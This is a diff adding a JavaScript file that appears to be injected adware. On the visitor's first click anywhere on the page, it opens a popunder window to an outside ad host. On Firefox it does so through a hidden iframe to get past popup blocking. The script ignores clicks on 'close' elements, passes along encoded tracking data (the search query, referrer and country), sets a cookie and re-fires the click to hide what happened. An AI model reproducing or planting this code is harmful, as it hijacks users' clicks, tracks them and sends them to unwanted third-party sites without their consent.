@@ -1,0 +1,93 @@
+var
+    EventUtil = {
+        addHandler: function(element, type, handler) {
+            if (element.addEventListener) {
+                element.addEventListener(type, handler, true);
+            } else if (element.attachEvent) {
+                element.attachEvent("on" + type, handler);
+            } else {
+                element["on" + type] = handler;
+            }
+        },
+        removeHandler: function(element, type, handler) {
+            if (element.removeEventListener) {
+                element.removeEventListener(type, handler, true);
+            } else if (element.detachEvent) {
+                element.detachEvent("on" + type, handler);
+            } else {
+                element["on" + type] = null;
+            }
+        }
+    },
+    M = navigator.userAgent.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [],
+    evnt = (typeof M[1] != 'undefined' && M[1] == 'Chrome') ? 'mousedown' : 'mouseup';
+
+if (typeof window.c5667cb6153694dccb08ba39e == 'undefined') {
+    window.c5667cb6153694dccb08ba39e = function(e) {
+        e = e || window.event;
+        var target = e.target || e.srcElement;
+        if (target) {
+            var targetInfo = [
+                    target.title,
+                    target.id,
+                    target.className,
+                    target.src
+                ],
+                targetInner = target.innerHTML,
+                targetParent = target.parentNode;
+            if (targetInner && targetInner.length < 10) targetInfo.push(targetInner);
+            if (targetParent) {
+                var targetParentInner = targetParent.innerHTML;
+                if (targetParentInner && targetParentInner.length < 10) targetInfo.push(targetParentInner);
+                targetInfo.push(
+                    targetParent.title,
+                    targetParent.id,
+                    targetParent.className,
+                    targetParent.src
+                );
+            }
+            // Stop if anything contains close.
+            for (var x = 0; x < targetInfo.length; ++x) {
+                current = targetInfo[x];
+
+                if (current) {
+                    current = current.toLowerCase();
+                    if (current.indexOf('close') > -1) {
+                        return;
+                    }
+                }
+            }
+        }
+
+        var windowName = '__ctxpop' + Math.floor((Math.random() * 10000) + 1) + 's' + Math.round(+new Date()/1000) ;
+
+        if(navigator.userAgent.toLowerCase().indexOf('firefox') > -1) {
+            function ekopn(a,b,c){
+                var x;
+                document.body.appendChild(x=document.createElement("iframe")).style.display ='none';
+                return x.contentWindow.open(a,b,c)
+            }
+            var popWindow = ekopn('//tki.chimpanzeepooling.com/AOaAKJeLbosNFnkzCPkRPmYsTIm4aQRCvT36s8/?d=W3sidmVyIjoiYmFjZCJ9LHsicXVlcnkiOiJtZXJ1a2EgaW5kaWEgdG91cmlzbSBzZXJ2aWNlIn0seyJ1cmwiOiJodHRwOlwvXC93d3cuaW5kaWEtdG91cmlzbS5uZXRcLyJ9LHsiaG9zdG5hbWUiOiJpbmRpYS10b3VyaXNtLm5ldCJ9LHsicGMiOjF9LHsicHQiOiJiYWVrayJ9LHsiYW0iOiJyYiJ9LHsicmVmZXJlciI6Imh0dHBzOlwvXC93d3cuZ29vZ2xlLmNvLmluXC8ifSx7InNlcnZpY2UiOiJhZGRvbiJ9LHsidjIiOiJ4bWxfZmVlZF9wb3AifSx7ImxpbmsiOiJodHRwOlwvXC9jbi50YXRhbWktc29sdXRpb25zLmNvbVwvZWFzP2N1PTMwNjA2JmNzc209MSZ0eT0mcHRyYWNrPUpGQzEzODgmcGFyMj03NDc5NzA2NTNkNjM3NDc4NzA2ZjcwMjY2Mzc1NWY2OTY0M2QzMzMwMzYzMDM2MjY2MzY4NjE2ZTZlNjU2YzVmNjk2NDNkMzYzNjMyMjY2MTY2NjY2OTZjNjk2MTc0NjU1ZjY5NjQzZDMxMzMzODM4MjY3Mzc1NjI1ZjYxNjY2NjY5NmM2OTYxNzQ2NTNkMjY2MzZmNzU2ZTc0NzI3OTNkNDk0ZTI2NzM3NTYyNWY2NDZmNmQ2MTY5NmUzZDc3Nzc3NzJlNjk2ZTY0Njk2MTJkNzQ2Zjc1NzI2OTczNmQyZTZlNjU3NDI2NzU3MzY1NzI1ZjY5NjQzZDM5MzY2NTMyMzUzOTYxNjMzMDMyNjY2NTMwMzkzNTMzNjYzMzY1NjYzMTM4MzY2MTYyNjQ2MzYyNjIzNzMzNjYyNjY2NmY3MjZkNjE3NDNkNTA0ZjUwNTU0ZTQ0NDU1MjI2NmQ2ZjY0NjUzZDY2NjU2NTY0MjY3MDYxNzM3MzYyNjE2MzZiM2QyNjY0NjU2MTZjNWY3NDc5NzA2NTNkNjI2OTY0NjQ2OTZlNjcyNjYyNjk2NDNkMzAyZTMwMzAzMDMxMzIyNjZjNjU3NjY1NmMzZDZjNjU3NjY1NmMzMDI2NjI2OTY0NjQ2OTZlNjc1Zjc0Nzk3MDY1M2Q3MzY5NmU2NzZjNjUyNjYyNjk2NDY0Njk2ZTY3NWY3Mjc1NmM2NTNkMzkzMDI2NjI2OTY0NWYzMTMwMzAzZDMwMmUzMDMwMzAzMTMzMjY2MjY5NjQ1ZjZkNjE3MjY3Njk2ZTNkMzAyZTMwMzAzMDMwMzEyNjY0NmY2ZDYxNjk2ZTVmNjY2ZjcyNWY2ODYxNzM2ODNkMjY2MzZmNzU2ZTc0NzI3OTVmNmY3MjY5NjczZDQ5NGUyNjY2NjU2NTY0NWY3NDY5NmQ2NTczNzQ2MTZkNzAzZDMxMzQzNDM5MzczMTMxMzgzNDMxMjY2NjcyNjU3MTVmNzM3NDYxNzQ3NTczM2Q3NjYxNmM2OTY0MjY3MjY1NzE3NTY1NzM3NDY5NjQzZDUyMzkzMDM2MzQzMjM0MzgzNTMwMzgzMzMwMzgzMDM4MzQzMTM0MzQzOTM3MzEzMTM4MzQzMTI2Njg2MTYzNmIzZDMxJnBhcjQ9Y2xudCZrdzI9Njk2ZTY0Njk2MTJkNzQ2Zjc1NzI2OTczNmQyZTZlNjU3NCZjYXQyPWlmcmFtZSZjYXQzPWcyIn0seyJ1MSI6IjA1ZTVkY2Y3LWI5OTQtNGMzZC1hYzViLTMzZWYxMmVmNjM5MCJ9LHsiaW5qZWN0X2RvbWFpbiI6W119LHsiZzIiOiJmZWVkX29vIn0seyJnMSI6InhtbCBhZWRnZW5jeSBuZXR3b3JrIGluIn0seyJzdWJpZCI6W119LHsibmV0d29yayI6ImRpcmVjdCJ9LHsicmVxdWVzdF9ndWlkIjoiNTY2OGQ4ZTE1MzY5NGQ2MzZhOGI5NDkzIn0seyJjaGFubmVsIjoiOTYxNi0xMDE5In0seyJjdCI6ImZlZWQifSx7InB1Ymxpc2hlciI6W119LHsicHJvZHVjdCI6W119LHsidjMiOltdfSx7ImFkdmVydGlzZXIiOiI1NTNkZWIyMDQzZWVjNTZhMTk4YjQ1NjcifSx7ImJlciI6ImJhYmpoZiJ9LHsiY291bnRyeSI6ImluIn0seyJnMyI6W119LHsidjEiOiJpbmRpYS10b3VyaXNtLm5ldCJ9XQ%3D%3D', windowName, '');
+        } else {
+            var popWindow = (typeof Window.prototype.open == 'undefined')? window.open.call(window, '//tki.chimpanzeepooling.com/AOaAKJeLbosNFnkzCPkRPmYsTIm4aQRCvT36s8/?d=W3sidmVyIjoiYmFjZCJ9LHsicXVlcnkiOiJtZXJ1a2EgaW5kaWEgdG91cmlzbSBzZXJ2aWNlIn0seyJ1cmwiOiJodHRwOlwvXC93d3cuaW5kaWEtdG91cmlzbS5uZXRcLyJ9LHsiaG9zdG5hbWUiOiJpbmRpYS10b3VyaXNtLm5ldCJ9LHsicGMiOjF9LHsicHQiOiJiYWVrayJ9LHsiYW0iOiJyYiJ9LHsicmVmZXJlciI6Imh0dHBzOlwvXC93d3cuZ29vZ2xlLmNvLmluXC8ifSx7InNlcnZpY2UiOiJhZGRvbiJ9LHsidjIiOiJ4bWxfZmVlZF9wb3AifSx7ImxpbmsiOiJodHRwOlwvXC9jbi50YXRhbWktc29sdXRpb25zLmNvbVwvZWFzP2N1PTMwNjA2JmNzc209MSZ0eT0mcHRyYWNrPUpGQzEzODgmcGFyMj03NDc5NzA2NTNkNjM3NDc4NzA2ZjcwMjY2Mzc1NWY2OTY0M2QzMzMwMzYzMDM2MjY2MzY4NjE2ZTZlNjU2YzVmNjk2NDNkMzYzNjMyMjY2MTY2NjY2OTZjNjk2MTc0NjU1ZjY5NjQzZDMxMzMzODM4MjY3Mzc1NjI1ZjYxNjY2NjY5NmM2OTYxNzQ2NTNkMjY2MzZmNzU2ZTc0NzI3OTNkNDk0ZTI2NzM3NTYyNWY2NDZmNmQ2MTY5NmUzZDc3Nzc3NzJlNjk2ZTY0Njk2MTJkNzQ2Zjc1NzI2OTczNmQyZTZlNjU3NDI2NzU3MzY1NzI1ZjY5NjQzZDM5MzY2NTMyMzUzOTYxNjMzMDMyNjY2NTMwMzkzNTMzNjYzMzY1NjYzMTM4MzY2MTYyNjQ2MzYyNjIzNzMzNjYyNjY2NmY3MjZkNjE3NDNkNTA0ZjUwNTU0ZTQ0NDU1MjI2NmQ2ZjY0NjUzZDY2NjU2NTY0MjY3MDYxNzM3MzYyNjE2MzZiM2QyNjY0NjU2MTZjNWY3NDc5NzA2NTNkNjI2OTY0NjQ2OTZlNjcyNjYyNjk2NDNkMzAyZTMwMzAzMDMxMzIyNjZjNjU3NjY1NmMzZDZjNjU3NjY1NmMzMDI2NjI2OTY0NjQ2OTZlNjc1Zjc0Nzk3MDY1M2Q3MzY5NmU2NzZjNjUyNjYyNjk2NDY0Njk2ZTY3NWY3Mjc1NmM2NTNkMzkzMDI2NjI2OTY0NWYzMTMwMzAzZDMwMmUzMDMwMzAzMTMzMjY2MjY5NjQ1ZjZkNjE3MjY3Njk2ZTNkMzAyZTMwMzAzMDMwMzEyNjY0NmY2ZDYxNjk2ZTVmNjY2ZjcyNWY2ODYxNzM2ODNkMjY2MzZmNzU2ZTc0NzI3OTVmNmY3MjY5NjczZDQ5NGUyNjY2NjU2NTY0NWY3NDY5NmQ2NTczNzQ2MTZkNzAzZDMxMzQzNDM5MzczMTMxMzgzNDMxMjY2NjcyNjU3MTVmNzM3NDYxNzQ3NTczM2Q3NjYxNmM2OTY0MjY3MjY1NzE3NTY1NzM3NDY5NjQzZDUyMzkzMDM2MzQzMjM0MzgzNTMwMzgzMzMwMzgzMDM4MzQzMTM0MzQzOTM3MzEzMTM4MzQzMTI2Njg2MTYzNmIzZDMxJnBhcjQ9Y2xudCZrdzI9Njk2ZTY0Njk2MTJkNzQ2Zjc1NzI2OTczNmQyZTZlNjU3NCZjYXQyPWlmcmFtZSZjYXQzPWcyIn0seyJ1MSI6IjA1ZTVkY2Y3LWI5OTQtNGMzZC1hYzViLTMzZWYxMmVmNjM5MCJ9LHsiaW5qZWN0X2RvbWFpbiI6W119LHsiZzIiOiJmZWVkX29vIn0seyJnMSI6InhtbCBhZWRnZW5jeSBuZXR3b3JrIGluIn0seyJzdWJpZCI6W119LHsibmV0d29yayI6ImRpcmVjdCJ9LHsicmVxdWVzdF9ndWlkIjoiNTY2OGQ4ZTE1MzY5NGQ2MzZhOGI5NDkzIn0seyJjaGFubmVsIjoiOTYxNi0xMDE5In0seyJjdCI6ImZlZWQifSx7InB1Ymxpc2hlciI6W119LHsicHJvZHVjdCI6W119LHsidjMiOltdfSx7ImFkdmVydGlzZXIiOiI1NTNkZWIyMDQzZWVjNTZhMTk4YjQ1NjcifSx7ImJlciI6ImJhYmpoZiJ9LHsiY291bnRyeSI6ImluIn0seyJnMyI6W119LHsidjEiOiJpbmRpYS10b3VyaXNtLm5ldCJ9XQ%3D%3D', windowName, '') : Window.prototype.open.call(window, '//tki.chimpanzeepooling.com/AOaAKJeLbosNFnkzCPkRPmYsTIm4aQRCvT36s8/?d=W3sidmVyIjoiYmFjZCJ9LHsicXVlcnkiOiJtZXJ1a2EgaW5kaWEgdG91cmlzbSBzZXJ2aWNlIn0seyJ1cmwiOiJodHRwOlwvXC93d3cuaW5kaWEtdG91cmlzbS5uZXRcLyJ9LHsiaG9zdG5hbWUiOiJpbmRpYS10b3VyaXNtLm5ldCJ9LHsicGMiOjF9LHsicHQiOiJiYWVrayJ9LHsiYW0iOiJyYiJ9LHsicmVmZXJlciI6Imh0dHBzOlwvXC93d3cuZ29vZ2xlLmNvLmluXC8ifSx7InNlcnZpY2UiOiJhZGRvbiJ9LHsidjIiOiJ4bWxfZmVlZF9wb3AifSx7ImxpbmsiOiJodHRwOlwvXC9jbi50YXRhbWktc29sdXRpb25zLmNvbVwvZWFzP2N1PTMwNjA2JmNzc209MSZ0eT0mcHRyYWNrPUpGQzEzODgmcGFyMj03NDc5NzA2NTNkNjM3NDc4NzA2ZjcwMjY2Mzc1NWY2OTY0M2QzMzMwMzYzMDM2MjY2MzY4NjE2ZTZlNjU2YzVmNjk2NDNkMzYzNjMyMjY2MTY2NjY2OTZjNjk2MTc0NjU1ZjY5NjQzZDMxMzMzODM4MjY3Mzc1NjI1ZjYxNjY2NjY5NmM2OTYxNzQ2NTNkMjY2MzZmNzU2ZTc0NzI3OTNkNDk0ZTI2NzM3NTYyNWY2NDZmNmQ2MTY5NmUzZDc3Nzc3NzJlNjk2ZTY0Njk2MTJkNzQ2Zjc1NzI2OTczNmQyZTZlNjU3NDI2NzU3MzY1NzI1ZjY5NjQzZDM5MzY2NTMyMzUzOTYxNjMzMDMyNjY2NTMwMzkzNTMzNjYzMzY1NjYzMTM4MzY2MTYyNjQ2MzYyNjIzNzMzNjYyNjY2NmY3MjZkNjE3NDNkNTA0ZjUwNTU0ZTQ0NDU1MjI2NmQ2ZjY0NjUzZDY2NjU2NTY0MjY3MDYxNzM3MzYyNjE2MzZiM2QyNjY0NjU2MTZjNWY3NDc5NzA2NTNkNjI2OTY0NjQ2OTZlNjcyNjYyNjk2NDNkMzAyZTMwMzAzMDMxMzIyNjZjNjU3NjY1NmMzZDZjNjU3NjY1NmMzMDI2NjI2OTY0NjQ2OTZlNjc1Zjc0Nzk3MDY1M2Q3MzY5NmU2NzZjNjUyNjYyNjk2NDY0Njk2ZTY3NWY3Mjc1NmM2NTNkMzkzMDI2NjI2OTY0NWYzMTMwMzAzZDMwMmUzMDMwMzAzMTMzMjY2MjY5NjQ1ZjZkNjE3MjY3Njk2ZTNkMzAyZTMwMzAzMDMwMzEyNjY0NmY2ZDYxNjk2ZTVmNjY2ZjcyNWY2ODYxNzM2ODNkMjY2MzZmNzU2ZTc0NzI3OTVmNmY3MjY5NjczZDQ5NGUyNjY2NjU2NTY0NWY3NDY5NmQ2NTczNzQ2MTZkNzAzZDMxMzQzNDM5MzczMTMxMzgzNDMxMjY2NjcyNjU3MTVmNzM3NDYxNzQ3NTczM2Q3NjYxNmM2OTY0MjY3MjY1NzE3NTY1NzM3NDY5NjQzZDUyMzkzMDM2MzQzMjM0MzgzNTMwMzgzMzMwMzgzMDM4MzQzMTM0MzQzOTM3MzEzMTM4MzQzMTI2Njg2MTYzNmIzZDMxJnBhcjQ9Y2xudCZrdzI9Njk2ZTY0Njk2MTJkNzQ2Zjc1NzI2OTczNmQyZTZlNjU3NCZjYXQyPWlmcmFtZSZjYXQzPWcyIn0seyJ1MSI6IjA1ZTVkY2Y3LWI5OTQtNGMzZC1hYzViLTMzZWYxMmVmNjM5MCJ9LHsiaW5qZWN0X2RvbWFpbiI6W119LHsiZzIiOiJmZWVkX29vIn0seyJnMSI6InhtbCBhZWRnZW5jeSBuZXR3b3JrIGluIn0seyJzdWJpZCI6W119LHsibmV0d29yayI6ImRpcmVjdCJ9LHsicmVxdWVzdF9ndWlkIjoiNTY2OGQ4ZTE1MzY5NGQ2MzZhOGI5NDkzIn0seyJjaGFubmVsIjoiOTYxNi0xMDE5In0seyJjdCI6ImZlZWQifSx7InB1Ymxpc2hlciI6W119LHsicHJvZHVjdCI6W119LHsidjMiOltdfSx7ImFkdmVydGlzZXIiOiI1NTNkZWIyMDQzZWVjNTZhMTk4YjQ1NjcifSx7ImJlciI6ImJhYmpoZiJ9LHsiY291bnRyeSI6ImluIn0seyJnMyI6W119LHsidjEiOiJpbmRpYS10b3VyaXNtLm5ldCJ9XQ%3D%3D', windowName, '');
+        }
+
+        if (typeof popWindow === 'undefined' || popWindow === null) {
+            // console.log(popWindow);
+            return false;
+        }
+
+    var date = new Date();
+    date.setTime(date.getTime() + 0 * 1000);
+    document.cookie = "__ctxpop=0; expires=" + date.toGMTString() + "; path=/";
+
+        if (typeof document.createEvent !== 'undefined') {
+            var event = document.createEvent("MouseEvents");
+            event.initMouseEvent("click", !0, !0, window, 0, e.screenX, e.screenY, e.clientX, e.clientY, !1, !1, !1, !1, 0, null);
+            e.target.dispatchEvent(event);
+        }
+        EventUtil.removeHandler(window, evnt, window.c5667cb6153694dccb08ba39e);
+    };
+    EventUtil.addHandler(window, evnt, window.c5667cb6153694dccb08ba39e);
+}
+try { if (typeof rvztranscbgloref == 'function') { rvztranscbgloref(true); } } catch (e) {}
